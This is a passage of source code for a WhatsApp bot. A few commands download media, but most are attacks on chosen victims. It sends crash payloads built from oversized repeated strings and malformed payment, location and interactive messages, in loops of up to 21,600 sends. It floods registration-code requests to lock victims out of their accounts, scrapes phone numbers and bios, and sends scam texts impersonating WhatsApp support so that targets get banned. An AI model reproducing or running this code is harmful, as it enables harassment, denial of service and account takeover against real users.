codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyz("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
rxhl.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break

case 'startytmp3':{
if (!q) return replyz(`Example : ${prefix + command} karna su sayang`)
const rxhlplay = require('./lib/ytdl2')
const { fetchBuffer } = require("./lib/storage2")
let yts = require("youtube-yts")
let search = await yts(q)
let anup3k = search.videos[0]
const pl= await rxhlplay.mp3(anup3k.url)
await rxhl.sendMessage(from,{
audio: fs.readFileSync(pl.path),
fileName: anup3k.title + '.mp3',
mimetype: 'audio/mp4', ptt: true,
contextInfo:{
externalAdReply:{
title:anup3k.title,
body: `Rxhl Official`,
thumbnail: await fetchBuffer(pl.meta.image),
mediaType:2,
mediaUrl:anup3k.url,
}

},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break

case 'yts': case 'ytsearch': {
if (!q) return replyz(`Example : ${prefix + command} story wa anime`)
yts = require("yt-search")
search = await yts(q)
nyaabanaayts = 'YouTube Search\n\n Result From '+q+'\n\n'
no = 1
for (let i of search.all) {
hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
}
rxhl.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: hasilpencarian }, { quoted: m })
}
break

case 'style': case 'styletext': {
let { styletext } = require('./lib/scraper')
if (!q) return replyz('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n\n`
}
replyz(teks)
}
break

case 'fliptext': {
if (args.length < 1) return replyz(`Example:\n${prefix}fliptext rxhl`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replyz(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break

case 'setppbot': case 'setbotpp': {
if (!isCreator) return replyz(global.nocreator)
if (!quoted) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyz(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await rxhl.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await rxhl.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyz(`Success`)
} else {
var memeg = await rxhl.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyz(`Success`)
}
}
break

case 'tiktokgirl':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/tiktokgirl.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokghea':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/gheayubi.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknukhty':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/ukhty.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoksantuy':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/santuy.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokkayes':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/kayes.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokpanrika':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/panrika.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknotnot':
replyz('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/notnot.json'))
hasil = pickRandom(asupan)
rxhl.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'nowa': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`insert Number, example: ${prefix+command} 62853388888xxx`)
var noteks = args[0]
if (!noteks.includes('x')) return replyz('Enter the suffix x to find the number?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')]: ''
var random_length = countInstances(noteks, 'x')
if (random_length > 4) {
  return replyz('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
}
var random;
replyz('Loading')
if (random_length == 1) {
  random = 10
} else if (random_length == 2) {
  random = 100
} else if (random_length == 3) {
  random = 1000
} else if (random_length == 4) {
  random = 10000
}
var nomerny = `Have a bio\n`
var no_bio = `\nWithout Bio / Default bio.\n`
var no_watsap = `\nNot registered on whatsapp\n`
var data = {}
for (let i = 0; i < random; i++) {
  var nu = ['1','2','3','4','5','6','7','8','9']
  var t1 = nu[Math.floor(Math.random() * nu.length)]
  var t2 = nu[Math.floor(Math.random() * nu.length)]
  var t3 = nu[Math.floor(Math.random() * nu.length)]
  var t4 = nu[Math.floor(Math.random() * nu.length)]
  var rndm;
  if (random_length == 1) {
    rndm = `${t1}`
  } else if (random_length == 2) {
    rndm = `${t1}${t2}`
  } else if (random_length == 3) {
    rndm = `${t1}${t2}${t3}`
  } else if (random_length == 4) {
    rndm = `${t1}${t2}${t3}${t4}`
  }
  var anu = await rxhl.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
  var anuu = anu.length !== 0 ? anu: false
  try {
    try {
      var anu1 = await rxhl.fetchStatus(anu[0].jid)
    } catch {
      var anu1 = '401'
    }
    if (anu1 == '401' || anu1.status.length == 0) {
      no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
    } else {
      const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
      if (!(year in data)) {
        data[year] = [];
      }
      data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
    }
  } catch {
    no_watsap += `${nomer0}${i}${nomer1}\n`
  }
}
const bio = Object.keys(data)
.map((key) => {
  return `*[ ${key} ]*\n${data[key].join('')}`
})
.join('\n')
const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
replyz(hasil)
}
break

case 'bugcrash': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sending bug to ${Pe} Please pause for 3 minutes*`)
break

case 'bugcrashv2': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Id Group')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sending bug to ${Pe} Please pause for 3 minutes*`)
break

case 'bugcrashv3': 
if (!isMurbug) return replyz(global.nocreator)

jumlah = 20
sendVariousMessages(from, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent a bug. Please pause for 3 minutes*`)
break

case 'ytmp3': case 'youtubemp3': {
if (!isMurbug) return replyz('*.*')
if (!q) return replyz(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%2`)
await loading()
downloadMp3(q)
}
break

case 'cek?': {
replyz('Bot Ready to Use 🤗')
}
break

case 'bugvid1':
if (!isMurbug) return replyz('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug1.mp4')
rxhl.sendMessage(from, {video: bugvid1},{quoted: rxhlbugnew})
break

case 'bugvid2':
if (!isMurbug) return replyz('*.*')
bugvid1 = fs.readFileSync('./lib/video/bug2.mp4')
rxhl.sendMessage(from, {video: bugvid1},{quoted: rxhlbugnew})
break

case 'paptt':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example ${prefix + command} foto/video`)
papttfoto = JSON.parse(fs.readFileSync('./lib/paptt-foto.json'))
papttvideo = JSON.parse(fs.readFileSync('./lib/paptt-video.json'))
titid1 = (pickRandom(papttfoto))
titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
replyz("Photos will be sent via private chat ( *PC* )")
rxhl.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan🥵'}, { quoted: m })
} else if (q == 'video') {
replyz("Video will be sent via private chat ( *PC* )")
rxhl.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🥵'}, { quoted: m })
}
break

case 'tourl': {
if (!isMurbug) return replyz(global.nocreator)
if (!quoted) return replyz(`Reply Media`)
replyz('*please wait a moment*')
let media = await rxhl.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
anuh = await TelegraPh(media)
replyz(util.format(anuh))
} else if (/video/.test(mime)) {
anuh = await TelegraPh(media)
replyz(util.format(anuh))
} else if (!/image/.test(mime)) {
anuh = await UploadFileUgu(media)
replyz(util.format(anuh))
}
await fs.unlinkSync(media)       
}
break

case 'txtban1':
if (!isMurbug) return replyz(global.nocreator)
replyz(`Hola😁, ¿necesitas dinero? Ofrezco un sitio de apuestas en línea con premios en metálico de $700 y condiciones simples. Puedes hacer un depósito mínimo de $70 y puedes duplicar tu dinero.
💰 Realice un depósito inmediatamente en mi sitio de apuestas en línea y obtenga la mayor cantidad de dinero posible. registrarse en mi sitio de apuestas en línea a través de
Enlace : https://registrarse.en.el.sitio.de.apuestas/
Correo electrónico : support@support.whatsapp.com
Whatsapp : https://api.whatsapp.com/send?phone=`)
break

case 'txtban2':
if (!isMurbug) return replyz(global.nocreator)
replyz(`Hola, ¿Necesitas un trabajo para ganar dinero? Quiero ofrecerte un trabajo muy fácil y podrás duplicar todo tu dinero. Te ofrezco un trabajo, concretamente ser administrador de un sitio de juegos de azar online con un premio de 900$ y un depósito mínimo de 70$. Si estás interesado en aceptar una oferta de trabajo mía, puedes comunicarte al número de soporte 👇
https://api.whatsapp.com/send?phone=
💰 También puedes participar en este juego de apuestas en línea registrándote en nuestro sitio y realizando un depósito mínimo de 70$. Vamos, deposita inmediatamente para duplicar tu dinero 💸. Regístrese en nuestro sitio de apuestas en línea y el enlace de registro está disponible a continuación 👇
https://registrarse.en.el.sitio.de.apuestas/
*support@support.whatsapp.com*`)
break

case 'txtban3':
if (!isMurbug) return replyz(global.nocreator)
replyz(`🎲 ONLINE-WETSEITE 🎲
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens rxhl888. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite rxhl888 einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite rxhl888
🎮 Wettseiten: https://register.rxhl888.bet/
Alternative zur Registrierung 👇
🎮 Facebook : Rxhl888
🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6289630514341
Bitte registrieren Sie sich, um Ihr Geld zu verdoppeln 🤤`)
break

case 'bugsystem':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 20
sendRepeatedMessages2(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'bugsystemv2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert id Target')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendRepeatedMessages2(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully submitted bug to group ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'bugsystemv3':
if (!isMurbug) return replyz(global.nocreator)

jumlah = 20
sendRepeatedMessages2(from, jumlah)
await sleep(2000)
replyz(`*</> Successfully submitted the bug. Please pause commenting for 3 minutes 🤗`)
break

case 'crash1jam':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 900
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'crash1hari':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
jumlah = 21600
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*</> Successfully sent bug to number ${Pe}. Please pause commenting for 3 minutes 🤗`)
break

case 'bannedno':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(' Enter the Target number Prefix "+" and Country Code')
await rxhl.sendMessage(from, {text: `اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ "1" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=${q}`},{quoted: m})
sleep(2000)
replyz(`👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned`)
break

case 'xreactpc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Target number')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await rxhl.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'xreactgc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Id Grup')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await rxhl.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'bugiospc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replyz(`</> Successfully submitted bug number ${victim}`)
}
break

case 'bugiosgc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
for (let i = 0; i < amount; i++) {
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replyz(`</> Successfully submitted bug number ${victim}`)
}
break

case 'bugaudiopc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `EllenOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
replyz(`</> Success Sending ${command} to number ${Pe}`)
}
break

case 'bugaudiogc': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `EllenOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
replyz(`</> Success Sending ${command} to group ${Pe}`)
}
break

case 'buglocpc':{
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
XeonOP = global.virtexpc
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `EllenOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `EllenOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
break

case 'buglocgc':{
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
XeonOP = global.virtexpc
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `EllenOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `EllenOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
break

case '🔥':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
XeonOP = global.virtexpc
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
await sleep(500)
sendLiveLocationMessage(Pe)
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `EllenOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(500)
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `EllenOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `EllenOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
sendListMessage(Pe)
await sleep(500)
}
replyz(`*</> Succes 🥰*`)
break

case 'tempban': {
if (!isMurbug) return replyz(global.nocreator)
if (!qtext) return replyz(`Example: ${prefix + command} 91|918xxxx`)
if (!/|/.test(qtext)) return replyz(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = qtext.split("|")[0]
let number = qtext.split("|")[1]
let fullNo = cCode + number
await replyz(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('session')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'bugparamspc':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
XeonOP = global.virtexpc
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
menuu = `🔥 BUG RXHL 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `${menuu}`
rxhl.sendButton(Pe,  hohe, m, {
body: ewe,
footer: XeonOP
})
}
replyz(`*</> Succes 🥰*`)
break

case 'bugparamsgc':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 12xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
XeonOP = global.virtexpc
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
for (let i = 0; i < amount; i++) {
menuu = `🔥 BUG RXHL 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `${menuu}`
rxhl.sendButton(Pe,  hohe, m, {
body: ewe,
footer: XeonOP
})
}
replyz(`*</> Succes 🥰*`)
break

case 'bugparamsin':
if (!isMurbug) return replyz(global.nocreator)
XeonOP = global.virtexpc
menuu = `🔥 BUG RXHL 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `${menuu}`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `rxhl`
})
replyz(`*</> Succes 🥰*`)
break

case "bughomepc":
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›EllenOfficial"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'RxhlBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await rxhl.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
replyz('</> Succes')
break

case "bughomegc": case 'crashgc-v1': case 'crashgc-v2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›EllenOfficial"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'RxhlBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await rxhl.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
replyz('</> Succes')
break

case 'cbug': case 'ckeren': case 'cganteng': case 'cios': case 'candro':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
sendListMessage(Pe)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'ddos':
